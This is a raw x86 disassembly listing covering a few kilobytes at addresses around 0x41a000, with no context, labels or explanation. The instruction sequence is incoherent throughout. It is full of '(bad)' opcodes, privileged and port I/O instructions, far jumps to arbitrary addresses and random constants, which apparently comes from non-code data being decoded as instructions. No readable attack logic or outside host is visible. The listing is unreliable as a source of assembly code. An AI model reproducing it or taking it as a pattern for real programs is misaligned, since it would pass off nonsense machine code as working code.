  41a008:	(bad)  
  41a009:	(bad)  
  41a00b:	sbb    al,BYTE PTR [ecx]
  41a00d:	adc    BYTE PTR [esi-0x58],bh
  41a010:	inc    esi
  41a011:	dec    edx
  41a012:	es or  eax,0xec34e71d
  41a018:	in     al,dx
  41a019:	div    BYTE PTR [esi+0xcfabeca]
  41a01f:	mov    eax,0xc6240946
  41a024:	(bad)  
  41a026:	pop    ss
  41a027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a028:	inc    ebx
  41a029:	pop    ecx
  41a02a:	pusha  
  41a02b:	fdiv   DWORD PTR [eax+0x5c472d4e]
  41a031:	jbe    0x41a025
  41a033:	sahf   
  41a034:	xor    cl,BYTE PTR [esi]
  41a036:	inc    BYTE PTR [ecx-0x676b0e81]
  41a03c:	mov    dl,0x3c
  41a03e:	mov    ah,0x86
  41a040:	mov    bh,0x8
  41a042:	ror    BYTE PTR [ebx-0x68],0x5a
  41a046:	inc    esp
  41a047:	and    al,BYTE PTR [eax+0x3a96e169]
  41a04d:	ret    0xc434
  41a050:	xlat   BYTE PTR ds:[ebx]
  41a051:	ins    DWORD PTR es:[edi],dx
  41a052:	outs   dx,DWORD PTR ds:[esi]
  41a053:	dec    ebp
  41a054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a055:	jmp    0x2ce060c6
  41a05a:	push   0x97b23fa1
  41a05f:	push   ss
  41a060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a061:	int    0xbd
  41a063:	fwait
  41a064:	cmp    DWORD PTR [esi+0x5b],ebx
  41a067:	retf   
  41a068:	aas    
  41a069:	sbb    al,0x46
  41a06b:	cmp    al,0x8c
  41a06d:	pop    ss
  41a06e:	loope  0x41a02b
  41a070:	sbb    BYTE PTR [ecx+0x7c],bh
  41a073:	push   cs
  41a074:	shr    ah,1
  41a076:	enter  0xf73c,0x8a
  41a07a:	xchg   BYTE PTR [ebx+0x5f],cl
  41a07d:	ja     0x41a0ca
  41a07f:	adc    DWORD PTR [esi+0x67cb6827],ebp
  41a085:	push   es
  41a086:	nop
  41a087:	fldcw  WORD PTR [ebx-0x19]
  41a08a:	stc    
  41a08b:	or     al,0x1f
  41a08d:	aam    0xf5
  41a08f:	rcl    dh,0xcb
  41a092:	(bad)  
  41a093:	je     0x41a09d
  41a095:	sub    BYTE PTR [esi+0x55],bl
  41a098:	inc    ebx
  41a099:	add    eax,0xdebfd9a4
  41a09e:	sub    esi,ecx
  41a0a0:	mov    al,ds:0x3e3c02dc
  41a0a5:	push   esi
  41a0a6:	xor    DWORD PTR [ecx],esp
  41a0a8:	cmp    edi,DWORD PTR [edx+edx*1-0x6f]
  41a0ac:	sub    al,BYTE PTR [ecx]
  41a0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0af:	lds    ebp,FWORD PTR [ecx]
  41a0b1:	out    0x51,eax
  41a0b3:	aam    0x22
  41a0b5:	test   eax,0xdd9bfa72
  41a0ba:	pop    ds
  41a0bb:	inc    eax
  41a0bc:	jbe    0x41a0c7
  41a0be:	mov    dh,0xc8
  41a0c0:	pcmpgtb mm3,QWORD PTR [edi]
  41a0c3:	rol    BYTE PTR [ebx+eiz*1],0x5a
  41a0c7:	std    
  41a0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c9:	lods   al,BYTE PTR ds:[esi]
  41a0ca:	in     al,0x1f
  41a0cc:	hlt    
  41a0cd:	pop    esp
  41a0ce:	mov    bh,0xf2
  41a0d0:	mov    ds:0xa45517bf,eax
  41a0d5:	cmp    edx,DWORD PTR [eax+0x79]
  41a0d8:	pop    es
  41a0d9:	mov    eax,0xe3905d2f
  41a0de:	sub    eax,0x1e19b569
  41a0e3:	bound  ecx,QWORD PTR [ecx*2+0xae584b]
  41a0ea:	(bad)
  41a0ee:	jge    0x41a0be
  41a0f0:	gs iret 
  41a0f2:	cdq    
  41a0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f4:	sub    ch,cl
  41a0f6:	repz iret 
  41a0f8:	int    0x2d
  41a0fa:	pop    ss
  41a0fb:	loop   0x41a086
  41a0fd:	cmp    eax,0x64813486
  41a102:	cmp    al,bl
  41a104:	xchg   esi,eax
  41a105:	mov    ebp,ss
  41a107:	mov    eax,ds:0x1d552240
  41a10c:	repnz lods al,BYTE PTR ds:[esi]
  41a10e:	pushf  
  41a10f:	cld    
  41a110:	retf   
  41a111:	(bad)  
  41a112:	adc    ebx,DWORD PTR [ebp+esi*4+0x49]
  41a116:	xor    cl,bh
  41a118:	pushf  
  41a119:	pop    es
  41a11a:	mov    al,0xc6
  41a11c:	aad    0x67
  41a11e:	mov    eax,0x82b613b8
  41a123:	in     eax,0x21
  41a125:	(bad)  
  41a126:	int3   
  41a127:	mov    edx,DWORD PTR [ebx+esi*2]
  41a12a:	jg     0x41a189
  41a12c:	std    
  41a12d:	sub    DWORD PTR [edx],0x95bf1754
  41a133:	push   ss
  41a134:	rol    BYTE PTR [ebx],0x21
  41a137:	mov    ds:0x967f4283,eax
  41a13c:	sbb    edi,ebx
  41a13e:	push   edi
  41a13f:	push   edi
  41a140:	mov    DWORD PTR [ebx-0x3a06b7d8],edx
  41a146:	sub    ah,BYTE PTR [edx+0x20]
  41a149:	sub    DWORD PTR [ebx+0x6ee96f33],ecx
  41a14f:	or     al,0x6d
  41a151:	or     ah,BYTE PTR [eax+0x59]
  41a154:	dec    edi
  41a155:	ret    
  41a156:	je     0x41a13a
  41a158:	scas   eax,DWORD PTR es:[edi]
  41a159:	inc    esi
  41a15a:	inc    ebp
  41a15b:	ss aas 
  41a15d:	mov    bh,bl
  41a15f:	int3   
  41a160:	inc    esp
  41a161:	mov    al,0x24
  41a163:	pusha  
  41a164:	es aam 0xd1
  41a167:	jecxz  0x41a11f
  41a169:	int    0x91
  41a16b:	add    eax,0x589b240b
  41a170:	xchg   esp,eax
  41a171:	inc    ecx
  41a172:	dec    esi
  41a173:	mov    dh,0x59
  41a175:	jo     0x41a171
  41a177:	cmp    edi,esp
  41a179:	(bad)  
  41a17a:	idiv   BYTE PTR [edi+0x66]
  41a17d:	or     ebp,DWORD PTR ds:0xb9ddca62
  41a183:	inc    ebx
  41a184:	loop   0x41a140
  41a186:	dec    eax
  41a187:	fst    QWORD PTR [ecx+0x485c9512]
  41a18d:	mov    ebp,0xd2fdff4f
  41a192:	repnz mov esi,0x211fcf2d
  41a198:	scas   al,BYTE PTR es:[edi]
  41a199:	cli    
  41a19a:	mov    ah,0xf3
  41a19c:	clc    
  41a19d:	lahf   
  41a19e:	lahf   
  41a19f:	data16 cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a1a2:	retf   0x7449
  41a1a5:	stc    
  41a1a6:	and    BYTE PTR [edx-0x2],ah
  41a1a9:	clc    
  41a1aa:	enter  0xa463,0x96
  41a1ae:	fiadd  DWORD PTR [ebx-0xb]
  41a1b1:	adc    BYTE PTR [edx-0x594be2b4],0x4
  41a1b8:	mov    esp,esp
  41a1ba:	cmp    BYTE PTR [edx+0x47],al
  41a1bd:	or     dh,BYTE PTR [ebp+0x22c915f9]
  41a1c3:	jne    0x41a18a
  41a1c5:	jge    0x41a15d
  41a1c7:	imul   eax,DWORD PTR [edx-0x341c4040],0x972332d2
  41a1d1:	xor    al,BYTE PTR [esi+0x3d79558d]
  41a1d7:	pop    esp
  41a1d8:	sub    al,0x17
  41a1da:	outs   dx,BYTE PTR ds:[esi]
  41a1db:	fist   DWORD PTR [si]
  41a1de:	cmp    eax,0xe84bf21c
  41a1e3:	arpl   WORD PTR [esi+ecx*4+0x15],si
  41a1e7:	adc    BYTE PTR [ecx],ah
  41a1e9:	aad    0x51
  41a1eb:	mov    dh,BYTE PTR [esi]
  41a1ed:	xor    dl,BYTE PTR [esi+esi*1]
  41a1f0:	mov    dl,BYTE PTR [edx]
  41a1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1f3:	jmp    0xdfdc:0x8b26bedc
  41a1fa:	fs sysexit 
  41a1fd:	mov    dl,0x97
  41a1ff:	xchg   esi,eax
  41a200:	or     bh,ch
  41a202:	jno    0x41a249
  41a204:	fld    QWORD PTR [esi]
  41a206:	out    dx,al
  41a207:	outs   dx,DWORD PTR ds:[esi]
  41a208:	jp     0x41a1b6
  41a20a:	sti    
  41a20b:	push   0x58
  41a20d:	jecxz  0x41a1c7
  41a20f:	mov    ebx,0x615d97f6
  41a214:	adc    al,0x6f
  41a216:	jp     0x41a1ac
  41a218:	pop    esp
  41a219:	cmpxchg BYTE PTR [esi+0x67],ch
  41a21d:	fcmovb st,st(3)
  41a21f:	test   esi,ebp
  41a221:	mov    ebx,0xf1fb06be
  41a226:	pop    esp
  41a227:	jmp    0x41a1ff
  41a229:	mov    ds:0x58456fdf,al
  41a22e:	push   ds
  41a22f:	imul   edx,eax,0x79ab4b80
  41a235:	add    BYTE PTR [ebp+edi*2-0x5d239f40],bh
  41a23c:	scas   eax,DWORD PTR es:[edi]
  41a23d:	sub    dl,ah
  41a23f:	mov    eax,ebp
  41a241:	pop    edx
  41a242:	das    
  41a243:	js     0x41a2bd
  41a245:	sar    DWORD PTR [eax],0x0
  41a248:	ds leave 
  41a24a:	loop   0x41a220
  41a24c:	mov    al,0x81
  41a24e:	daa    
  41a24f:	mov    ah,0x30
  41a251:	cwde   
  41a252:	ss mov esp,0x8183b398
  41a258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a259:	repnz dec DWORD PTR [ecx+0xc9431ea]
  41a260:	into   
  41a261:	test   BYTE PTR [ebx],0x4e
  41a264:	sbb    eax,0xae6bdb47
  41a269:	and    ebp,ebx
  41a26b:	fdiv   st,st(1)
  41a26d:	int    0xaf
  41a26f:	dec    ecx
  41a270:	not    ah
  41a272:	and    al,0x76
  41a274:	mov    al,0x3f
  41a276:	mov    eax,ds:0x33e0b86a
  41a27b:	mov    ah,0xc9
  41a27d:	test   BYTE PTR [esi-0x3f],cl
  41a280:	imul   esi,DWORD PTR [ebx+0x6126f39a],0x10
  41a287:	sbb    DWORD PTR [ebx+edx*4-0x43ba4ff6],ecx
  41a28e:	push   edi
  41a28f:	xor    eax,0x14e78a75
  41a294:	lods   al,BYTE PTR ds:[esi]
  41a295:	mov    al,0x88
  41a297:	das    
  41a298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a299:	cdq    
  41a29a:	xor    bh,bl
  41a29c:	sbb    al,0xf1
  41a29e:	inc    ebp
  41a29f:	mov    al,ds:0xd698080e
  41a2a4:	arpl   WORD PTR [ecx+0x53],di
  41a2a7:	jp     0x41a2b5
  41a2a9:	xor    eax,0x6000e5e6
  41a2ae:	xchg   DWORD PTR [ebx-0x2f],edx
  41a2b1:	imul   edx,DWORD PTR [edi+0x397b4812],0xf66d6a16
  41a2bb:	push   ebp
  41a2bc:	lahf   
  41a2bd:	jo     0x41a2e1
  41a2bf:	mov    dh,0x9
  41a2c1:	jns    0x41a311
  41a2c3:	inc    eax
  41a2c4:	pop    esp
  41a2c5:	add    edx,ecx
  41a2c7:	mov    ah,0x7
  41a2c9:	xchg   edi,eax
  41a2ca:	xchg   esi,eax
  41a2cb:	or     al,0x16
  41a2cd:	retf   
  41a2ce:	sbb    al,dh
  41a2d0:	call   0x3d0c24f0
  41a2d5:	mov    eax,ds:0xa18d4454
  41a2da:	lods   al,BYTE PTR ds:[esi]
  41a2db:	pop    ecx
  41a2dc:	test   DWORD PTR [esi+edx*8+0x2791ab9d],ebx
  41a2e3:	dec    edx
  41a2e4:	cld    
  41a2e5:	sbb    eax,0x9733ca97
  41a2ea:	aaa    
  41a2eb:	jle    0x41a2c6
  41a2ed:	sbb    esp,ebp
  41a2ef:	and    al,0x44
  41a2f1:	sub    esp,DWORD PTR ds:0x81fa31be
  41a2f7:	stos   BYTE PTR es:[edi],al
  41a2f8:	sbb    eax,0xdc17f317
  41a2fd:	dec    esp
  41a2fe:	pop    esp
  41a2ff:	mov    BYTE PTR [ebp+0x7a],ah
  41a302:	add    ebp,DWORD PTR [esi+ecx*1+0x63d47b99]
  41a309:	sbb    BYTE PTR [ebp+0x5],bh
  41a30c:	bnd je 0x41a2f7
  41a30f:	mov    ds:0x5170d7e6,al
  41a314:	pop    ecx
  41a315:	aam    0x7c
  41a317:	xlat   BYTE PTR ds:[ebx]
  41a318:	cmp    DWORD PTR [ecx-0x2d],esi
  41a31b:	xchg   BYTE PTR [eax-0x8f92536],ah
  41a321:	xchg   esi,eax
  41a322:	mov    edi,0x37f9a1db
  41a327:	mov    WORD PTR [ebp-0x741c3999],?
  41a32d:	cs aam 0xbb
  41a330:	sub    DWORD PTR cs:[eax+0x37],ebx
  41a334:	mov    esi,esi
  41a336:	dec    edi
  41a337:	mov    bl,0x97
  41a339:	int3   
  41a33a:	int    0x4b
  41a33c:	fisubr DWORD PTR [esi+0x33]
  41a33f:	adc    DWORD PTR [ecx-0x7aa42982],ebx
  41a345:	ds repnz dec ebx
  41a348:	add    DWORD PTR [ebp-0x19],ebp
  41a34b:	leave  
  41a34c:	and    dh,bl
  41a34e:	mov    DWORD PTR [ebp-0x7a],0x2363859
  41a355:	jno    0x41a38a
  41a357:	xor    bh,0x6a
  41a35a:	(bad)  
  41a35b:	pop    edx
  41a35c:	cmc    
  41a35d:	jl     0x41a306
  41a35f:	ret    
  41a360:	std    
  41a361:	aas    
  41a362:	push   ss
  41a363:	fwait
  41a364:	aas    
  41a365:	fmul   DWORD PTR [ecx-0x3858e140]
  41a36b:	jmp    0xdc29:0xd1f6e8d
  41a372:	jae    0x41a344
  41a374:	pusha  
  41a375:	inc    edi
  41a376:	mov    edi,0x65356421
  41a37c:	retf   0x4f79
  41a37f:	push   esi
  41a380:	cdq    
  41a381:	xchg   ebx,eax
  41a382:	sub    edi,DWORD PTR [edx-0x1d]
  41a385:	in     eax,dx
  41a386:	and    cl,BYTE PTR [esi+0x18]
  41a389:	(bad)  
  41a38a:	or     edi,DWORD PTR [esi+ebx*4-0x1a]
  41a38e:	leave  
  41a38f:	ins    DWORD PTR es:[edi],dx
  41a390:	int    0xd7
  41a392:	das    
  41a393:	adc    al,0xe2
  41a395:	loopne 0x41a31c
  41a397:	mov    al,0x50
  41a399:	mov    ah,0x4b
  41a39b:	jl     0x41a391
  41a39d:	bnd call 0x146d04bf
  41a3a3:	fsubr  QWORD PTR [edx-0x50f22ee6]
  41a3a9:	mov    bl,0xc8
  41a3ab:	jne    0x41a41d
  41a3ad:	pop    ds
  41a3ae:	pop    eax
  41a3af:	(bad)  
  41a3b0:	not    ebx
  41a3b2:	pop    ds
  41a3b3:	jp     0x41a39b
  41a3b5:	imul   esp,DWORD PTR [ecx],0xffffff95
  41a3b8:	xchg   DWORD PTR [eax],edx
  41a3ba:	bound  ebx,QWORD PTR [eax-0x4b]
  41a3bd:	cmp    BYTE PTR [edx+0x69],bl
  41a3c0:	lods   eax,DWORD PTR ds:[esi]
  41a3c1:	add    dl,BYTE PTR [esi+0x28a462c2]
  41a3c7:	les    ecx,FWORD PTR [edi+0x54052513]
  41a3cd:	pop    ds
  41a3ce:	shr    BYTE PTR [ebp+eax*1-0x35],1
  41a3d2:	dec    esi
  41a3d3:	jb     0x41a3bd
  41a3d5:	mul    BYTE PTR [eax]
  41a3d7:	sub    bh,BYTE PTR [ebp+0x6f]
  41a3da:	cmp    edx,ebx
  41a3dc:	sbb    eax,0xa1e6fcac
  41a3e1:	inc    edx
  41a3e2:	js     0x41a3b5
  41a3e4:	stos   DWORD PTR es:[edi],eax
  41a3e5:	jbe    0x41a3d4
  41a3e7:	bound  ebp,QWORD PTR [ebp-0x359afe6a]
  41a3ed:	je     0x41a39f
  41a3ef:	lods   al,BYTE PTR ds:[esi]
  41a3f0:	pop    ss
  41a3f1:	loop   0x41a3ad
  41a3f3:	and    eax,0xaa94e202
  41a3f8:	inc    ebx
  41a3f9:	mov    ebx,0xbd781700
  41a3fe:	mov    ah,0xd4
  41a400:	scas   eax,DWORD PTR es:[edi]
  41a401:	cmp    dh,BYTE PTR [edx+edi*4+0x29]
  41a405:	(bad)  
  41a406:	push   esi
  41a407:	xor    al,0xfb
  41a409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a40a:	and    al,0xb9
  41a40c:	cs inc edx
  41a40e:	repnz retf 
  41a410:	fld    DWORD PTR [edi]
  41a412:	xchg   BYTE PTR [eax+0x5d92e1cc],ch
  41a418:	mov    cl,0x54
  41a41a:	sbb    DWORD PTR gs:[ecx-0xd],ecx
  41a41e:	push   edi
  41a41f:	sti    
  41a420:	xchg   edi,eax
  41a421:	pop    edi
  41a422:	and    eax,0x953efe33
  41a427:	fcom   QWORD PTR ds:0xa1bdf981
  41a42d:	mov    dl,0x3f
  41a42f:	(bad)  
  41a431:	jno    0x41a486
  41a433:	fadd   DWORD PTR [edi+0x9]
  41a436:	jbe    0x41a45b
  41a438:	pop    ss
  41a439:	int    0x36
  41a43b:	push   eax
  41a43c:	sbb    bl,bh
  41a43e:	mov    ah,BYTE PTR ds:0x9a426e6c
  41a444:	and    BYTE PTR [esp+ecx*4-0x5682cb8d],0xa1
  41a44c:	sbb    eax,0x932440c8
  41a451:	sahf   
  41a452:	pop    edi
  41a453:	(bad)  [edx-0x75d8e88a]
  41a459:	xor    al,0xae
  41a45b:	jne    0x41a4ad
  41a45d:	outs   dx,BYTE PTR ds:[esi]
  41a45e:	cli    
  41a45f:	jge    0x41a421
  41a461:	fsubp  st(3),st
  41a463:	iret   
  41a464:	imul   edi,DWORD PTR [eax-0x730a22f9],0xfffffff7
  41a46b:	push   edi
  41a46c:	and    ah,BYTE PTR [esp+esi*4]
  41a46f:	pop    es
  41a470:	xor    dh,BYTE PTR [ecx]
  41a472:	add    cl,BYTE PTR [edi-0x3f895b1c]
  41a478:	push   ebp
  41a479:	ret    
  41a47a:	mov    dl,BYTE PTR [esi]
  41a47c:	(bad)  
  41a47d:	call   0xb7a0:0x5568e161
  41a484:	icebp  
  41a485:	clc    
  41a486:	call   0x5a2976f6
  41a48b:	call   0x1c93cca6
  41a490:	repnz jecxz 0x41a48f
  41a493:	mov    cl,0xa
  41a495:	loopne 0x41a498
  41a497:	adc    DWORD PTR [ecx+0x6216fa2],edx
  41a49d:	into   
  41a49e:	or     DWORD PTR [edx-0x18],0x1e
  41a4a2:	mov    cl,0x1
  41a4a4:	xchg   ebx,eax
  41a4a5:	sub    DWORD PTR [ebx],edi
  41a4a7:	fdiv   QWORD PTR [esi]
  41a4a9:	xor    al,0x35
  41a4ab:	test   eax,0x529686d3
  41a4b0:	mov    ch,0x54
  41a4b2:	dec    edi
  41a4b3:	test   eax,0xc204fe5
  41a4b8:	xor    DWORD PTR [ebx-0x43],edx
  41a4bb:	stc    
  41a4bc:	icebp  
  41a4bd:	dec    ecx
  41a4be:	fstp   TBYTE PTR [ecx+0x28]
  41a4c1:	pop    es
  41a4c2:	out    dx,eax
  41a4c3:	js     0x41a50e
  41a4c5:	ret    
  41a4c6:	pop    edx
  41a4c7:	dec    eax
  41a4c8:	sbb    DWORD PTR [edx+ebx*1+0x1],ecx
  41a4cc:	mov    al,ds:0x78e0b4af
  41a4d1:	mov    ecx,0x45847d28
  41a4d6:	inc    ebx
  41a4d7:	adc    DWORD PTR [ecx-0x63f77692],ecx
  41a4dd:	in     al,dx
  41a4de:	push   es
  41a4df:	mov    ebp,?
  41a4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e2:	jbe    0x41a46f
  41a4e4:	inc    esp
  41a4e5:	hlt    
  41a4e6:	pop    es
  41a4e7:	dec    ecx
  41a4e8:	loope  0x41a4a6
  41a4ea:	fs sub al,0xe9
  41a4ed:	pusha  
  41a4ee:	sub    BYTE PTR [ebp+0x6b0bd168],cl
  41a4f4:	mov    ch,bl
  41a4f6:	aad    0x6b
  41a4f8:	bound  esi,QWORD PTR [ecx+0x55]
  41a4fb:	pop    esp
  41a4fc:	jo     0x41a548
  41a4fe:	adc    al,0xda
  41a500:	int    0x7a
  41a502:	ins    BYTE PTR es:[edi],dx
  41a503:	mov    dl,0x2
  41a505:	jo     0x41a573
  41a507:	push   ebx
  41a508:	fiadd  DWORD PTR [eax+ecx*2]
  41a50b:	push   0x3e
  41a50d:	pop    esi
  41a50e:	sar    BYTE PTR [eax],0xb8
  41a511:	mov    ebx,0xff24fb7e
  41a516:	adc    esi,edi
  41a518:	adc    eax,0xceccaf6b
  41a51d:	loopne 0x41a574
  41a51f:	cmp    ecx,DWORD PTR [eax+eax*4]
  41a522:	inc    esp
  41a523:	sub    esp,ebp
  41a525:	xor    al,0x8f
  41a527:	sti    
  41a528:	sub    ebp,edi
  41a52a:	(bad)  
  41a52b:	pop    ds
  41a52c:	adc    ebp,edi
  41a52e:	mov    ebx,ebp
  41a530:	stc    
  41a531:	outs   dx,DWORD PTR ds:[esi]
  41a532:	and    bl,BYTE PTR [eax-0x67e27804]
  41a538:	add    al,0x23
  41a53a:	je     0x41a4db
  41a53c:	cs (bad) 
  41a53e:	ins    DWORD PTR es:[edi],dx
  41a53f:	das    
  41a540:	div    DWORD PTR [edi+0x4]
  41a543:	inc    esp
  41a544:	or     al,0xa8
  41a546:	mov    ds:0xf708f725,al
  41a54b:	fld    DWORD PTR [ebx-0x61]
  41a54e:	leave  
  41a54f:	cmp    DWORD PTR [edx-0x7b],ecx
  41a552:	cmp    cl,dl
  41a554:	mov    esi,0x9cdd3ab0
  41a559:	add    DWORD PTR [ebx+0x1b],eax
  41a55c:	dec    eax
  41a55d:	imul   ebp
  41a55f:	sbb    edi,DWORD PTR [ecx]
  41a561:	lds    esp,FWORD PTR gs:[eax-0xc3a88ff]
  41a568:	pop    ebp
  41a569:	(bad)  [ebp-0x33]
  41a56c:	push   ecx
  41a56d:	add    al,0xdd
  41a56f:	out    dx,al
  41a570:	sub    edi,DWORD PTR [edx-0x49]
  41a573:	and    DWORD PTR [ecx-0x1db29cc0],esp
  41a579:	xchg   ebx,eax
  41a57a:	add    esp,DWORD PTR [eax-0x66]
  41a57d:	lods   al,BYTE PTR ds:[esi]
  41a57e:	outs   dx,BYTE PTR ds:[esi]
  41a57f:	pop    esi
  41a580:	aas    
  41a581:	sahf   
  41a582:	dec    eax
  41a583:	scas   eax,DWORD PTR es:[edi]
  41a584:	aad    0x27
  41a586:	mov    ch,0xb6
  41a588:	cdq    
  41a589:	mov    al,0x1e
  41a58b:	aam    0x2e
  41a58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58e:	mov    edx,0x3319d7cc
  41a593:	lea    ecx,[edx+edx*1-0x1e]
  41a597:	jl     0x41a5ea
  41a599:	ins    BYTE PTR es:[edi],dx
  41a59a:	loop   0x41a58b
  41a59c:	cmp    DWORD PTR [eax+0x4443f4f7],0x1e
  41a5a3:	add    dl,BYTE PTR [edx-0x36b3bb8e]
  41a5a9:	bound  eax,QWORD PTR [esi]
  41a5ab:	outs   dx,BYTE PTR ds:[esi]
  41a5ac:	and    ecx,edx
  41a5ae:	and    ah,bh
  41a5b0:	repz std 
  41a5b2:	neg    BYTE PTR [edx]
  41a5b4:	xor    eax,0x2dded5f8
  41a5b9:	mov    esi,DWORD PTR [edx+0x73]
  41a5bc:	mov    eax,ds:0xafcedcdd
  41a5c1:	or     ebx,DWORD PTR [ebx+esi*4]
  41a5c4:	inc    ebx
  41a5c5:	mov    eax,0x9030dbe6
  41a5ca:	jae    0x41a5d7
  41a5cc:	jmp    0x18125ce
  41a5d1:	neg    DWORD PTR [ebp-0x680e66c2]
  41a5d7:	imul   eax,DWORD PTR [edx],0x74ae9d96
  41a5dd:	cs jecxz 0x41a596
  41a5e0:	mov    ecx,0xe1a5156b
  41a5e5:	ins    DWORD PTR es:[edi],dx
  41a5e6:	(bad)  [ebx]
  41a5e8:	outs   dx,BYTE PTR ds:[esi]
  41a5e9:	dec    esp
  41a5ea:	loope  0x41a663
  41a5ec:	fadd   st,st(4)
  41a5ee:	sbb    BYTE PTR [edi],0xa9
  41a5f1:	jne    0x41a603
  41a5f3:	cmp    BYTE PTR [ebx],dh
  41a5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5f6:	sbb    esp,eax
  41a5f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f9:	mov    cl,0x8
  41a5fb:	sub    eax,0x5ca7df4f
  41a600:	mov    edi,0x58966800
  41a605:	mov    ch,0x68
  41a607:	sub    ah,BYTE PTR [eax-0x58]
  41a60a:	or     eax,0x77294347
  41a60f:	sub    bl,BYTE PTR [ecx+edi*8+0xae1ec78]
  41a616:	and    BYTE PTR [ecx-0xd77063c],dl
  41a61c:	test   BYTE PTR [edx+edx*8],bh
  41a61f:	mov    bh,0xf6
  41a621:	sbb    DWORD PTR [edi-0x476f0df8],0xb9d67758
  41a62b:	jecxz  0x41a69c
  41a62d:	aaa    
  41a62e:	push   0x77
  41a630:	pop    esi
  41a631:	jne    0x41a5c8
  41a633:	jp     0x41a610
  41a635:	mov    WORD PTR [edx],ax
  41a638:	jp     0x41a699
  41a63a:	sbb    al,0x32
  41a63c:	sub    BYTE PTR [eax-0x15],cl
  41a63f:	xchg   ebp,eax
  41a640:	dec    esi
  41a641:	adc    BYTE PTR [edx+0x17],dl
  41a644:	pop    esi
  41a645:	sub    al,BYTE PTR [eax]
  41a647:	mul    DWORD PTR [ebx+0xd7b6bb3]
  41a64d:	std    
  41a64e:	jnp    0x41a69c
  41a650:	mov    al,0xba
  41a652:	outs   dx,DWORD PTR ds:[esi]
  41a653:	inc    ebp
  41a654:	loop   0x41a646
  41a656:	mov    eax,0xdc15895c
  41a65b:	xor    BYTE PTR [edi-0x9750ae1],bl
  41a661:	imul   ebx,esp,0xffffffb4
  41a664:	push   ebp
  41a665:	jb     0x41a5f9
  41a667:	shr    BYTE PTR [edx+0xf],cl
  41a66a:	dec    ecx
  41a66b:	dec    ebp
  41a66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a66d:	pop    es
  41a66e:	jb     0x41a65b
  41a670:	repnz nop
  41a672:	xchg   esi,eax
  41a673:	sbb    cl,ch
  41a675:	xor    bh,ch
  41a677:	popf   
  41a678:	call   0x11c58903
  41a67d:	mov    bh,0x2e
  41a67f:	sub    al,0x4f
  41a681:	(bad)  
  41a682:	cmc    
  41a683:	sbb    eax,0x4549f042
  41a688:	or     DWORD PTR [eax+ecx*8-0x7e],edx
  41a68c:	outs   dx,BYTE PTR ds:[esi]
  41a68d:	fcomp  DWORD PTR [edx-0x51c8e3e1]
  41a693:	sub    dh,dl
  41a695:	jmp    0x736628cd
  41a69a:	fs mov ebx,0xec087476
  41a6a0:	les    edx,FWORD PTR [esi+0x7e]
  41a6a3:	mov    ds:0xa30f105d,al
  41a6a8:	fnsave [ecx+esi*8]
  41a6ab:	int3   
  41a6ac:	add    BYTE PTR [edx+0x68b553f],ah
  41a6b2:	push   ecx
  41a6b3:	or     BYTE PTR [ebx],bl
  41a6b5:	lods   al,BYTE PTR ds:[esi]
  41a6b6:	daa    
  41a6b7:	sbb    DWORD PTR [edi],esp
  41a6b9:	loop   0x41a694
  41a6bb:	inc    edi
  41a6bc:	add    ah,BYTE PTR [esi-0xbe2201e]
  41a6c2:	jns    0x41a689
  41a6c4:	fst    DWORD PTR [esi]
  41a6c6:	out    dx,eax
  41a6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6c8:	pusha  
  41a6c9:	pushf  
  41a6ca:	ror    BYTE PTR [edi+0x13],1
  41a6cd:	pop    esi
  41a6ce:	mov    edx,0x4e86240c
  41a6d3:	retf   0x741c
  41a6d6:	and    al,0xb0
  41a6d8:	push   es
  41a6d9:	mov    ?,ebx
  41a6db:	fwait
  41a6dc:	inc    eax
  41a6dd:	pop    eax
  41a6de:	adc    DWORD PTR [edi-0x147c3dfe],0xcd5ee034
  41a6e8:	mov    esi,0x94eb667a
  41a6ed:	ja     0x41a737
  41a6ef:	fcmovnu st,st(2)
  41a6f1:	(bad)  
  41a6f2:	xor    DWORD PTR [ebx+0x1e6f5930],esp
  41a6f8:	data16 sahf 
  41a6fa:	data16 cli 
  41a6fc:	cld    
  41a6fd:	imul   ecx,DWORD PTR [ebx-0x35b3d2d0],0x713f829f
  41a707:	jmp    0xa27a:0xf1308152
  41a70e:	ret    
  41a70f:	dec    ebp
  41a710:	cmp    DWORD PTR [esi-0x743a37e2],0xffffffcf
  41a717:	inc    ecx
  41a718:	hlt    
  41a719:	iret   
  41a71a:	mov    eax,0x5417a584
  41a71f:	mov    al,ds:0x466403d0
  41a724:	inc    edx
  41a725:	pushf  
  41a726:	stos   BYTE PTR es:[edi],al
  41a727:	dec    ebp
  41a728:	push   edx
  41a729:	stos   BYTE PTR es:[edi],al
  41a72a:	add    ah,0xbb
  41a72d:	xchg   BYTE PTR [ecx-0x75e1f0ce],cl
  41a733:	inc    ebx
  41a734:	popf   
  41a735:	std    
  41a736:	fcom   DWORD PTR ds:0x6579fddd
  41a73c:	std    
  41a73d:	daa    
  41a73e:	inc    ebp
  41a73f:	mov    ds:0xf8015fba,eax
  41a744:	or     al,0xd
  41a746:	dec    edi
  41a747:	dec    ecx
  41a748:	jo     0x41a6d8
  41a74a:	sahf   
  41a74b:	add    eax,0x15132311
  41a750:	add    bl,dl
  41a752:	retf   0x60a7
  41a755:	fidiv  WORD PTR [edx-0x390ba025]
  41a75b:	dec    edi
  41a75c:	xchg   edi,eax
  41a75d:	jp     0x41a6f0
  41a75f:	xor    ch,BYTE PTR [ebx]
  41a761:	jo     0x41a753
  41a763:	inc    eax
  41a764:	aas    
